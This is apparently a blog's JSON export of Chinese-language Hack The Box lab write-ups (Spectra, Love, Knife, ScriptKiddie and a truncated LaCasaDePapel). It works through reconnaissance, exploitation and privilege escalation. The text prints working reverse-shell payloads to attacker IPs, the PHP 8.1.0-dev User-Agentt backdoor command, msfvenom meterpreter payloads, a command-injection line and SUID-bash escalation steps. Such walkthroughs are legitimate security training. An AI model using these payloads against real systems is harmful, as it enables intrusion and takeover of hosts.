rhosts 10.10.10.229\n\nset lhost 10.10.14.135\n\nexploit\n\n![](Hackthebox-Spectra/a46c68a1-4aad-4f22-8e17-e2cbb80103ad.png)\n\nnice 成功获取到一个shell\n\n第二种：\n\n修改404页面进行反弹shell\n\n首先本地使用nc监听一个端口\n\nnc -nvlp 5555\n\n![](Hackthebox-Spectra/f0fedb03-849e-4e78-8dd5-1d58ee44a324.png)\n\n然后咱们登入到网站后台\n\n![](Hackthebox-Spectra/6fdc0e3e-5b36-48bb-81b5-38ebd78f36f9.png)\n\n修改404页面的源码\n\n咱们插入恶意代码\n\n下载地址\n\n[http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz)\n\n其中需要修改的内容\n\nset\\_time\\_limit (0);\n\n\\$VERSION = \"1.0\";\n\n\\$ip = '10.10.14.135'; // CHANGE THIS\n\n\\$port = 5555; // CHANGE THIS\n\n\\$chunk\\_size = 1400;\n\n\\$write\\_a = null;\n\n\\$error\\_a = null;\n\n\\$shell = 'uname -a; w; id; /bin/sh -i';\n\n\\$daemon = 0;\n\n\\$debug = 0;\n\n![](Hackthebox-Spectra/e5eef879-2e13-4c24-b8aa-cd62e9758d21.png)\n\n然后点击保存\n\n![](Hackthebox-Spectra/2dbab099-3772-4acb-b524-8744271bca13.png)\n\n啊这，好像失败了，诸位等我稍稍研究一下\n\n![](Hackthebox-Spectra/a5657c34-b7b4-4f8c-a5d7-c2e7e2241f5c.png)\n\n好了，经过测试，咱们将模板设置为Twenty Sevente就可以保存了\n\n然后咱们访问404页面\n\n[http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php](http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php)\n\n成功反弹回shell\n\n![](Hackthebox-Spectra/b6633049-275d-4919-8110-0ababc2d1387.png)\n\n第三种：\n\n第三种就是利用插件上传的漏洞，然后使用msf来进行shell的接收，这个步骤咱们不如直接第一步了，有点多此一举，有兴趣的朋友可以自己进行研究\n\nexploit地址\n\n[https://www.exploit-db.com/exploits/36374](https://www.exploit-db.com/exploits/36374)\n\nmsf设置\n\nuse exploit/unix/webapp/wp\\_slideshowgallery\\_upload\n\nset rhosts 192.168.1.101\n\nset targeturi /wordpress\n\nexploit\n\nexec（“ / bin / bash -c'bash -i>＆/dev/tcp/10.0.0.1/8080 0>＆1'”）\n\n参考连接\n\n[https://www.hackingarticles.in/wordpress-reverse-shell/](https://www.hackingarticles.in/wordpress-reverse-shell/)\n\n**权限提升**\n\n咱们首先使用python3获取一个更加稳定的shell\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n![](Hackthebox-Spectra/d0abe880-965e-4e04-8897-f4e3f60cdc28.png)\n\n![](Hackthebox-Spectra/031c4c92-5481-4b75-878a-49d2bc8c8a52.png)\n\n我们在翻找文件的时候，在opt目录下发现了一个autologin.conf.orig文件\n\ncat查看后，发现是有个自动登录的脚本，指向了/etc/autologin\n\n咱们过去看看\n\n![](Hackthebox-Spectra/68955dcb-37aa-4078-a482-58bab345286c.png)\n\n发现了一个passwd文件，咱们cat查看\n\n![](Hackthebox-Spectra/cde245bf-6acc-4175-a3ee-4d49616b1f14.png)\n\n得到了一个密码\n\nSummerHereWeCome!!\n\n![](Hackthebox-Spectra/7ca73e26-e17c-4b04-addc-d0db95a41efb.png)\n\n![](Hackthebox-Spectra/311a7387-27e8-4097-a0db-d589564d98a8.png)\n\n经过测试并结合咱们找flag以及翻目录的时候得到的消息来看，似乎是用户katie的\n\n正好开启了22端口，咱们使用ssh进行登录\n\nssh katie@10.10.10.229\n\n![](Hackthebox-Spectra/4e2c24d0-1b7a-40b5-a8c1-c7c385f44f05.png)\n\n成功登录\n\n![](Hackthebox-Spectra/bd7b8a2c-88f5-4a08-bc95-2c849f0921f9.png)\n\n成功获得user权限的flag\n\n使用sudo -l查看一下咱们的sudo权限\n\n![](Hackthebox-Spectra/f2657385-cc50-4cd3-98f2-6fe2895c5b04.png)\n\n发现咱们可以执行/sbin/initctl\n\n这个权限是查看咱们可编辑的服务\n\nsudo initctl list\n\n![](Hackthebox-Spectra/c5ec8080-9167-4e6f-9414-aafab9bcbf65.png)\n\n可编辑的服务挺多的，我就不全部截图了，然后咱们进行筛选查看\n\n![](Hackthebox-Spectra/f55fb7d0-8370-45a5-a0c6-4f6e4146a1fd.png)\n\n咱们在最后面看到一个名为test2的未运行且可编辑的服务，叫这个名字那就肯定不一般了，咱们look look，所有的服务都在/etc/init目录下\n\n![](Hackthebox-Spectra/bd45f2a9-0b96-4350-88df-892961fa151b.png)\n\n这么多test的服务，咱们就从test.conf开始look吧\n\ncat /etc/init/test.conf\n\n![](Hackthebox-Spectra/31500707-851f-4c1f-8d56-8f9bd9994c2d.png)\n\n嗯。。。在这里正在运行一个nodejs的文件 nodetest.js 咱们也去look look\n\ncat /srv/nodetest.js\n\n![](Hackthebox-Spectra/5ebce451-c36c-4c06-b548-9060b1f8161f.png)\n\n咱们将恶意代码替换到test.conf里，然后执行进行提权吧，其实也可以更改nodetest.js的文件进行nc反弹并提权，但是好麻烦啊，我就给各位一个图，大家有兴趣的自己研究吧，我使用第二种办法，直接修改test.conf的内容吧\n\n第一种：\n\n![](Hackthebox-Spectra/442af819-76f1-4641-96de-a5f88281c22e.png)\n\n第二种：\n\nnano /etc/init/test.conf\n\n![](Hackthebox-Spectra/10cbc613-7c64-4b88-aa5f-1554c5d35d9e.png)\n\n执行如下命令即可提权\n\nsudo /sbin/initctl start test\n\n使用sudo权限启动test服务\n\nls -l /bin/bash\n\n查看/bin/bash即可发现我们的SUID已经传递给root用户\n\n/bin/bash -p\n\n提权\n\n![](Hackthebox-Spectra/0312313f-804d-4e16-a25d-14dcfdde16ad.png)\n\n提权成功\n\n![](Hackthebox-Spectra/5614724f-e90f-4335-bbda-f4f461446ca4.png)\n\n成功获得root权限的flag 完事儿收工睡觉","tags":["Hackthebox"]},{"title":"Love - Hackthebox","url":"/2021/05/26/Hackthebox/Easy/Hackthebox-Love/","content":"\n# Hackthebox - Love\n# **靶场信息**\n![](Hackthebox-Love/8fa5e3c7-59bb-4c60-ba00-e55d24097e26.png)\n\n# **靶场类型**\n![](Hackthebox-Love/2cc5ea23-2092-4367-aeeb-bc80eaa3ea66.png)\n\n# **信息搜集**\n## Nmap\n首先使用nmap进行基本的端口探测\n\nNmap -A -sS -sV -sC 10.10.10.239\n\n![](Hackthebox-Love/b4a37f46-931a-492d-9d88-ee1e4d726fcc.png)\n\nNmap探测到开启了80、135、139、443、445、3306、5000、5040、5985、5986、47001、49664-49670之间的端口，其中80和443还有5000为web服务\n\nNmap探测发现 443端口的ssl证书上提示了两个域名， 分别为love.htb以及staging.love.htb\n\n我们通过修改hosts文件指定这两个域名解析的IP为靶场的IP 10.10.10.239\n\n```bash\nVim /etc/hosts\n```\n![](Hackthebox-Love/dbd938df-c131-4b5a-b7fa-2cfd79fe89af.png)\n\n## Http\n我们访问5000端口看看有什么东西\n\n![](Hackthebox-Love/b134a206-6392-419e-8cb8-173cf5431e73.png)\n\n提示我们没有访问的权限，那就先不管这个，我们去看看80端口\n\n![](Hackthebox-Love/21338137-44c9-46d8-b6ac-f9f0d791d2e3.png)\n\n80端口有一个登录框\n\n通过搜索voting system系统发现是存在注入的\n\n漏洞参考地址\n\n> [https://www.exploit-db.com/exploits/49817](https://www.exploit-db.com/exploits/49817)\n\n> [https://www.exploit-db.com/exploits/49846](https://www.exploit-db.com/exploits/49846)\n\n我们抓个包来注入一波\n\n![](Hackthebox-Love/efceb2a5-95bb-4c33-b72e-3e678861dcaf.png)\n\n将抓到的数据包保存在本地，使用sqlmap进行注入\n\n没有注入出来，我们放弃这个思路，来看看第二个域名\n\n# **漏洞利用**\n> [http://staging.love.htb/](http://staging.love.htb/)\n\n进入该页面后，有两个可点击的按钮，分别是Home和Demo\n\nHome是一个登陆口，或许有注入，但先看看其他功能\n\n![](Hackthebox-Love/108f2f98-b662-4ce6-8bbe-fc73a4708922.png)\n\n点击Demo，进入这个页面\n\n![](Hackthebox-Love/e19a6d8d-62b6-474f-aa72-cfa4231cada3.png)\n\n似乎是一个扫描器，咱们随便扫描一个页面试试\n\n随便扫描了一个页面，没有什么反应，思路到这里就卡壳了呀。\n\n在打了一把LOL被队友坑了后，突然来了思路\n\n我们不是有一个无权限访问的5000端口吗，那让它自己发出访问请求，是否就有权限了？说干就干\n\n![](Hackthebox-Love/90768d7f-e87f-4133-8f04-92e3291beb48.png)\n\n弹出了如下页面\n\n![](Hackthebox-Love/945fe27c-aae1-45b0-b82c-85664482d161.png)\n\n这时候我们就拿到密码了账号和密码\n\n账号admin\n\n密码@LoveIsInTheAir!!!!\n\n然后我们去登录\n\n![](Hackthebox-Love/1b7f6861-3ec2-4727-983c-2dc67c3863d5.png)\n\n提示找不到这个ID？这不对劲啊兄弟\n\n咱们去找一下这个cms\n\n经过搜索后，找到了该cms的源码\n\n您猜怎么着？还真让我找到了哎嘿\n\n> [https://www.sourcecodester.com/php/12306/voting-system-using-php.html](https://www.sourcecodester.com/php/12306/voting-system-using-php.html)\n\n这是咱们找到的cms源码\n\n其中看到了一个使用教程\n\n![](Hackthebox-Love/e60bc649-a1c2-4210-9c13-192c45b82b3d.png)\n\n根据提示，后台登录页面在/admin/下，这个index.php就是用来迷惑咱们的，我直接好家伙\n\n咱们访问/admin/目录进行登录\n\n![](Hackthebox-Love/0f0b1217-5c4d-4572-b3ab-394371ef9369.png)\n\n我直接好家伙，咱们用账号密码进行登录\n\n![](Hackthebox-Love/716020cf-ca5e-4133-91f7-e66195536eaf.png)\n\n总算是排除万难进入后台了\n\n这里咱们使用Voters来进行getshell\n\n![](Hackthebox-Love/b8526e08-f60e-49a6-8ea5-74526c9b051e.png)\n\n创建一个新选民\n\n![](Hackthebox-Love/cb593e86-1778-42b9-b7e1-ffbd7a72ae19.png)\n\n在photo处传入我们的shell或是一句话木马，进入\n\n> [http://love.htb/images](http://love.htb/images)\n\n查看我们的shell是否上传上去\n\n![](Hackthebox-Love/080b154b-af31-4b1d-a977-dd94066479c4.png)\n\n可以看到，我们的shell已经上传上去了，咱们进入shell\n\n![](Hackthebox-Love/b352b680-3366-4989-8a2a-6d67cd5275e9.png)\n\nOK 咱们成功获得了一个交互式shell，但毕竟不是一个稳定的shell，咱们接下来想办法获得一个稳定的shell，并且因为某些脚本的原因，我们上传的webshell可能会被删除\n\n咱们使用msfvenom生成一个exe的木马\n\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.135 LPORT=4444 -f exe > shell.exe\n```\n![](Hackthebox-Love/66aafce4-d79e-4f26-b437-b52ef4cf759d.png)\n\n使用msfconsole进行监听\n\n```bash\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.14.135\nset LPORT 4444\nexploit\n```\n![](Hackthebox-Love/f494a0a8-25ad-49a0-bca0-1894adaa429c.png)\n\n然后我们本地使用python3开启一个http服务\n\n```bash\npython3 -m http.server 80\n```\n然后在shell里使用curl进行下载\n\n```bash\nCurl [http://10.10.14.135/shell.exe -o shell.exe](http://10.10.14.135/shell.exe%20-o%20shell.exe)\n```\n![](Hackthebox-Love/b7d16c08-189e-4ad3-8432-1c61710e7658.png)\n\nOK，成功下载下来了，咱们直接运行该木马\n\n![](Hackthebox-Love/766d2271-2293-42cd-aa27-baeddf4bb55f.png)\n\n运行后成功弹回了shell\n\n![](Hackthebox-Love/b3e81634-96be-4c46-8b5f-6f624ae88b8d.png)\n\n![](Hackthebox-Love/0dbb4cb9-fbc0-41e5-8488-eb1e0a16d0e6.png)\n\n我们成功获得第一个flag\n\n# **权限提升**\n找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。\n\n我们查看一下alwaysinstallelevated的设置\n\n```bash\nreg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n```\n![](Hackthebox-Love/8c7f5b1a-6aae-4a4e-ab07-32806aa07967.png)\n\n结果均为0x1，也就是存在该漏洞\n\n使用msfvenom生成一个msi马\n\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.135 LPORT=5555 -f msi > shell.msi\n```\n![](Hackthebox-Love/2e07d007-32c8-4e1f-9fb8-c9e48238e52c.png)\n\n再单独开一个msfconsole进行监听\n\n```bash\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.14.135\nset LPORT 5555\nexploit\n```\n![](Hackthebox-Love/d4e0207f-6e3b-46ab-a572-ca217a222f66.png)\n\n然后上传我们的msi马\n\n![](Hackthebox-Love/0ec9e2cb-713b-4954-bac2-fc9469849dff.png)\n\n成功上传\n\n然后在之前获取的shell中输入指令shell即可进入shell（绕口令？）\n\n使用msiexec /quiet /qn /i shell.msi运行msi马\n\n```bash\n/quiet = Suppress any messages to the user during installation\n/qn = No GUI\n/i = Regular (vs. administrative) installation\n```\n![](Hackthebox-Love/a8adb08c-1143-478f-82c9-28a5e9558f9a.png)\n\n![](Hackthebox-Love/ff1b7080-2315-44cd-acf7-45c574abc507.png)\n\n提权成功\n\n![](Hackthebox-Love/c0b55adc-cb18-4893-b6ee-a60286ef51ed.png)\n\n成功获取到管理员权限的shell","tags":["Hackthebox"]},{"title":"Knife - Hackthebox","url":"/2021/05/24/Hackthebox/Easy/Hackthebox-Knife/","content":"\n# Hackthebox - Knife\n# 靶场信息\n![](Hackthebox-Knife/15ebd948-9e9e-4db2-9a0d-6b58eb00e111.png)\n\n# 靶场类型\n![](Hackthebox-Knife/a7e52db3-54c7-4bf3-99f1-f7bc84cb077f.png)\n\n# 信息搜集\n## Nmap\n首先使用nmap进行端口扫描\n\n![](Hackthebox-Knife/3d61a375-a663-4661-bb80-f03b76b45a6b.png)\n\n我们得知开启了22和80端口\n\n出于能不爆破就不爆破的原则，先访问80端口看一下\n\n## Http\n![](Hackthebox-Knife/a61fd32c-dfc4-4f77-a654-fc3d3564e183.png)\n\n80端口上的内容有点不明所以。\n\n在完全没思路的情况下，尝试使用dirbuster工具进行了目录爆破，但四十分钟过去了却没有一丁点收获，连robots.txt页面也不存在。\n\n我的思路就卡在这里了，一时之间不知道应该怎么做，就去泡了杯茶，突然来了灵感，要不先抓个包看看？\n\n![](Hackthebox-Knife/6c777717-b915-411c-8527-fa96d51fb30a.png)\n\n乍一看似乎没有什么值得关注的东西，但在通宵日靶场导致神志不清又经过了茶叶洗礼的脑瓜子的引导下，我注意到了一个点。\n\n```cpp\nX-Powered-By: PHP/8.1.0-dev\n```\n这东西，隐约之间觉得不简单，便去百度进行了搜索。搜索的同时尝试了nikto工具，也提示了这一条\n\n![](Hackthebox-Knife/1bf61095-16b8-45e5-a3ea-f032b42a3d2a.png)\n\n就是这两个提示，让我确信突破口在这，然后经过大量的google和百度搜索后，找到了一丝思路。\n\nPHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码。\n\n# 漏洞利用\n![](Hackthebox-Knife/c1845bd9-d45b-4edc-a792-184423e1ad48.png)\n\n使用burp抓包，并加入字段\n\n```cpp\nUser-Agentt: zerodiumvar_dump(2*3);\n```\n发现被成功执行\n\n接着尝试命令是否可被解析执行\n\n```cpp\nUser-Agentt: zerodiumsystem(\"id\");\n```\n![](Hackthebox-Knife/7f2bcd66-d61d-4353-94d6-56cee2290f49.png)\n\nNice 命令可被执行，那就简单了，可以执行命令，那就尝试getshell吧\n\n本地监听：\n\n```cpp\nNc –nvlp 9001\n```\n执行命令：\n\n```cpp\nUser-Agentt: zerodiumsystem(\"/bin/bash -c 'bash -i >&/dev/tcp/10.10.14.240/9001 0>&1'\");\n```\n![](Hackthebox-Knife/7fef4f44-69ed-4c20-984c-42b911a65a6f.png)\n\n成功通过nc获得了一个shell\n\n首先确定是否有python\n\n```cpp\nWhich python3\n```\n![](Hackthebox-Knife/8409a9e1-ee94-4144-bcb2-64ec30da0aef.png)\n\n确定python3存在，使用python3获得一个交互式 shell 程序\n\n```cpp\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\n![](Hackthebox-Knife/627cb565-e7cd-4608-9107-0ba62eaf3800.png)\n\n成功获得普通用户的flag\n\n# 权限提升\n先确定knife用户的sudo权限\n\n```bash\nSudo –l\nLs –al /usr/bin/knife\n```\n![](Hackthebox-Knife/166415a5-7729-4898-a0c8-3dd90577ba24.png)\n\n进行提权\n\n```bash\necho \"system('chmod +s /bin/bash')\" > exploit.rb\nls\nsudo /usr/bin/knife exec exploit.rb\nls -al /bin/bash\n/bin/bash –p\n```\n![](Hackthebox-Knife/9bd29c84-d31d-41c9-af25-53022c05fe37.png)\n\n获得root用户的flag\n\n![](Hackthebox-Knife/997a63c7-c726-4518-9c9e-3f57974e4a40.png)","tags":["Hackthebox"]},{"title":"ScriptKiddie - Hackthebox","url":"/2021/05/24/Hackthebox/Easy/Hackthebox-ScriptKiddie/","content":"\n# Hackthebox - ScriptKiddie\n**Hackthebox-ScriptKiddie靶场实战**\n\n靶场信息\n\n![](Hackthebox-ScriptKiddie/7a534b9d-b47d-45a8-8740-b7309044837f.png)\n\n靶场类型\n\n![](Hackthebox-ScriptKiddie/a2ea7254-49e2-42b9-b0c6-e4592efdf79a.png)\n\n信息搜集\n\n先使用nmap进行最基本的端口扫描\n\nnmap -A -sS -sV -sC 10.10.10.226\n\n![](Hackthebox-ScriptKiddie/e511ae46-85df-4431-b5fa-f913d377841e.png)\n\n发现开启了22端口和5000端口，再次基于能不爆破就不爆破的原则，我们直接看5000端口\n\n5000端口上运行了Werkzeug，通过google搜索发现Werkzeug存在Werkzeg debug shell漏洞，但对比了下版本不适用，那就只能先访问5000端口看看具体情况了\n\n![](Hackthebox-ScriptKiddie/c9e0df80-af0f-4eeb-b592-dcb2c36736ce.png)\n\n这是一个继承了nmap、msfvenom、searchsploit工具的一个小黑客工具？那就先尝试一下他的工具吧。使用nmap扫描一下本地端口\n\n![](Hackthebox-ScriptKiddie/9c50b024-27d9-4f09-8c2a-241750fde5f9.png)\n\n我们获得的信息有nmap版本为7.80\n\n尝试搜索漏洞\n\n![](Hackthebox-ScriptKiddie/79b6d3da-5196-4fe9-8a3d-3d9c9e17c39a.png)\n\n通过google和exploit-db均未发现可getshell的漏洞，放弃该思路\n\n漏洞利用\n\n我们把目光放到第二个工具msfvenom上\n\n搜索venom发现了一个APK模板命令注入漏洞\n\n![](Hackthebox-ScriptKiddie/e06af414-5690-4847-b3f7-6dd764f269f3.png)\n\n将exploit-db上的exp给下载下来并进行修改\n\n![](Hackthebox-ScriptKiddie/ebf005c2-ff4a-444a-a859-66c97e8b5a99.png)\n\n然后执行该EXP\n\n![](Hackthebox-ScriptKiddie/60b36e3f-7d3b-4c29-94de-6b81213f15db.png)\n\n获得了evil.apk文件，在本地监听443端口后将该文件上传\n\n![](Hackthebox-ScriptKiddie/f3b36089-d3b0-4ac1-8f99-998f98936d63.png)\n\n![](Hackthebox-ScriptKiddie/028bb04c-a9a9-4b7a-bcb2-d5756b1516cc.png)\n\n能弹回来，但shell似乎有问题，我们直接使用msf来生成，免去麻烦\n\n首先运行msf然后\n\nuse exploit/unix/fileformat/metasploit\\_msfvenom\\_apk\\_template\\_cmd\\_injection来载入exp\n\n设置好ip和端口后输入exploit执行\n\n![](Hackthebox-ScriptKiddie/b31ff21e-ad67-4c22-9696-dd1badb88371.png)\n\n获得脚本/root/.msf4/local/msf.apk\n\n![](Hackthebox-ScriptKiddie/d68c6f85-2144-4e3a-94a4-dd3694782525.png)\n\n然后本地使用nc监听4444端口\n\nNc –nvlp 4444\n\n使用5000端口上的第二个脚本进行上传\n\n![](Hackthebox-ScriptKiddie/2cbbcdc9-3312-4910-93b3-33f09d8ae062.png)\n\n成功反弹回一个shell，我们执行以下命令获得一个稳定的shell\n\nSHELL=/bin/bash script -q /dev/null\n\n![](Hackthebox-ScriptKiddie/60e7863d-313d-47a7-9eba-435f6aad39d4.png)\n\n在根目录下我们成功取得普通用户的flag\n\n![](Hackthebox-ScriptKiddie/2fe629f8-2b73-447e-8baa-fa3016fbf1e8.png)\n\n权限提升\n\n进入home目录，发现除了我们使用的kid用户以外，还有一个pwn用户\n\n![](Hackthebox-ScriptKiddie/78ee58dc-3fe4-4ef7-91ac-1fb04f9a294e.png)\n\n进入目录并查看文件\n\n![](Hackthebox-ScriptKiddie/d41b4682-8f47-4d28-957a-18b394c5cab2.png)\n\n发现有一个scanlosers.sh脚本\n\n我们查看一下脚本内容\n\n![](Hackthebox-ScriptKiddie/2c2e4c6b-a2d9-4567-afd9-5c9afe03a966.png)\n\n该脚本会一直扫描/home/kid/logs/hackers的目录文件的IP地址\n\n该脚本未对hackers文件传入的内容做过滤，并且我们使用的kid用户也有对该文件的编辑权限，我们直接写入一个命令执行，来让他把pwn用户的权限反弹给我们\n\n我们本地监听一个新的端口5555\n\nNc –nvlp 5555\n\n![](Hackthebox-ScriptKiddie/83530a5b-8c31-4822-a7de-1752b3a4b84d.png)\n\n先切换到logs目录\n\nCd logs\n\n![](Hackthebox-ScriptKiddie/38bef9fc-4097-43d6-a2c3-8646c4ecc1fc.png)\n\n然后写入恶意代码\n\necho \" ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.135/5555 0>&1' #\" >> hackers\n\n直接使用echo输入，或是手动编辑均可，只要能把命令写入进去即可\n\n![](Hackthebox-ScriptKiddie/b843ae8b-a7e9-42b4-80d0-b00cc509f91e.png)\n\n写入成功，并成功反弹回pwn用户的shell\n\n![](Hackthebox-ScriptKiddie/8ba61c98-c746-4b19-9207-ae5227af30e3.png)\n\n使用sudo -l检查一下pwn用户的权限\n\n![](Hackthebox-ScriptKiddie/a04c9bef-b633-4245-b0f3-05a36f1fe0d2.png)\n\n发现pwn用户拥有msf的权限，且不需要root密码，直接进入msf调用root权限\n\nsudo /opt/metasploit-framework-6.0.9/msfconsole\n\n![](Hackthebox-ScriptKiddie/b59b1ab2-6caf-4016-a35f-77ff3617faa6.png)\n\n成功使用root权限进入msf，此时咱们已经拥有root权限，直接进入root目录拿root用户的flag即可\n\n![](Hackthebox-ScriptKiddie/3ba5507b-c0b2-4ae4-82b4-0c1ae9bd44a1.png)\n\n成功拿下root权限的flag\n\n收工睡觉","tags":["Hackthebox"]},{"title":"LaCasaDePapel - Hackthebox","url":"/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/","content":"\n# Hackthebox - LaCasaDePapel\n\n# 靶场信息\n![](Hackthebox-LaCasaDePapel/6b58Ut0mtbPB0F60tlaOYk9wK0SSnrcaQH4TKrGZ7-I.png)\n\n# 靶场类型\n![](Hackthebox-LaCasaDePapel/fM0Aoky4NfvsaJCOKqpG_2CribG6BAjZwdWyXy5r570.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.131\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:07 CST\nNmap scan report for 10.10.10.131\nHost is up (0.51s latency).\nNot shown: 65530 closed tcp ports (reset)\nPORT     STATE    SERVICE  VERSION\n21/tcp   open     ftp      vsftpd 2.3.4\n22/tcp   open     ssh      OpenSSH 7.9 (protocol 2.0)\n| ssh-hostkey: \n|   2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA)\n|   256 41e495a3390b25f9dadebe6adc59486d (ECDSA)\n|_  256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519)\n80/tcp   open     http     Node.js (Express middleware)\n|_http-title: La Casa De Papel\n443/tcp  open     ssl/http Node.js Express framework\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Server returned status 401 but no WWW-Authenticate header.\n| tls-alpn: \n|_  http/1.1\n| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel\n| Not valid before: 2019-01-27T08:35:30\n|_Not valid after:  2029-01-24T08:35:30\n| tls-nextprotoneg: \n|   http/1.1\n|_  http/1.0\n|_ssl-date: TLS randomness does not represent time\n6200/tcp filtered lm-x\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=1/9%OT=21%CT=1%CU=43703%PV=Y%DS=2%DC=T%G=Y%TM=63BB22C2\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O\nOS:1=M537ST11NW6%O2=M537ST11NW6%O3=M537NNT11NW6%O4=M537ST11NW6%O5=M537ST11N\nOS:W6%O6=M537ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R\nOS:=Y%DF=Y%T=40%W=7210%O=M537NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%\nOS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y\nOS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R\nOS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=\nOS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S\nOS:)\n\nNetwork Distance: 2 hops\nService Info: OS: Unix\n\nTRACEROUTE (using port 110/tcp)\nHOP RTT       ADDRESS\n1   386.92 ms 10.10.16.1\n2   632.59 ms 10.10.10.131\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 86.65 seconds\n```\n## Http\n![](Hackthebox-LaCasaDePapel/X-hpNQ3_TscJc9tVQPDCr4IvF_5fvPnRyNR1dSwUt0U.png)\n\n首页面没什么可以点的，`GET FREE TRIAL` 点了无效，做一下信息收集看看把\n\n![](Hackthebox-LaCasaDePapel/BkOtU0i4yqSm_bIdlzC9-H2DpbO9HjVvTvNMPB7rjSE.png)\n\n使用 https 访问，会提示需要提供客户端证书才可以使用\n\n这里扫目录也没扫出其他东西，我们去看看其他思路\n\n# 漏洞利用\n# Ftp\n目前 ftp 使用的版本是 `vsftpd 2.3.4` ，我印象中是有漏洞的，去搜索一下\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# searchsploit vsftpd 2.3.4\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                   |  Path\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                        | unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                           | unix/remote/17491.rb\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n确实是有一个漏洞，一个后门命令执行，使用上面那个脚本没成功，去尝试一下 msf 吧\n\n```bash\nmsf6 > search vsftpd 2.3.4\n\nMatching Modules\n================\n\n   #  Name                                  Disclosure Date  Rank       Check  Description\n   -  ----                                  ---------------  ----       -----  -----------\n   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution\n\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor\n\nmsf6 > use 0\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options \n\nModule options (exploit/unix/ftp/vsftpd_234_backdoor):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit\n   RPORT   21               yes       The target port (TCP)\n\n\nPayload options (cmd/unix/interact):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\n\nView the full module info with the info, or info -d command.\n```\n我们填写上域名，然后直接运行\n\n```bash\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.131\nrhosts => 10.10.10.131\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit \n\n[*] 10.10.10.131:21 - The port used by the backdoor bind listener is already open\n[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell\n[*] Exploit completed, but no session was created.\n```\n这里似乎提示在 6200 端口，但是我尝试了一下 6200 端口也是无法利用的，在 nmap 的时候 6200 端口也是 filtered 状态的，去尝试直接连接试试\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nc 10.10.10.131 6200\nPsy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman\nhelp\n  help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?                     \n  ls         List local, instance or class variables, methods and constants.              Aliases: list, dir             \n  dump       Dump an object or primitive.                                                                                \n  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man             \n  show       Show the code for an object, class, constant, method or property.                                           \n  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?  \n  whereami   Show where you are in the code.                                                                             \n  